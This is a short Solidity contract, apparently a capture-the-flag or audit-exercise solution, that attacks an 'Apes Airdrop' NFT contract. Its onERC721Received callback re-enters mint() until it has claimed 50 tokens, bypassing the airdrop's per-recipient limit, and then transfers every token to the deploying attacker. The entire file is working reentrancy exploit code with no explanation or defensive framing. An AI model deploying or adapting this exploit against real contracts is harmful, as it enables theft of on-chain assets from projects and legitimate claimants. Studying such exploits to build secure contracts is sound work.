// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IApesAirdrop {
    function mint() external returns (uint16);

    function grantMyWhitelist(address to) external;

    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract AttackAirdrop is IERC721Receiver {
    IApesAirdrop apesAirdrop;
    address payable attacker;
    uint16 public maxSupply = 50;
    uint16 public currSupply;

    constructor(address _airdrop) payable {
        apesAirdrop = IApesAirdrop(_airdrop);
        attacker = payable(msg.sender);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (currSupply < maxSupply) {
            currSupply++;
            apesAirdrop.mint();
            return 0x150b7a02;
        } else {
            for (uint i = 1; i <= maxSupply; i++) {
                apesAirdrop.transferFrom(address(this), attacker, i);
            }
            return 0x150b7a02;
        }
    }

    function attack() public {
        currSupply++;
        apesAirdrop.mint();
    }
}
